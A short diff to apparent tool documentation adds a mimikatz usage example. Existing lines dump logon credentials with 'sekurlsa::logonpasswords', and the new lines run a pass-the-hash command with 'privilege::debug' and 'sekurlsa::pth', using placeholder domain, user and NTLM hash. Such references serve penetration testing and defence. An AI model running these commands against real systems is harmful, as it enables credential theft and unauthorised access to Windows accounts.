@@ -25,6 +25,8 @@ Example
 ```
 mimikatz sekurlsa::logonpasswords
 mimikatz -Command sekurlsa::logonpasswords
+# in case several commands should be executed don't forget to escape the quotes
+mimikatz -Command \"privilege::debug\" \"sekurlsa::pth /domain:DOMAIN /user:USERNAME /ntlm:HASH\" exit
 ```
 
 
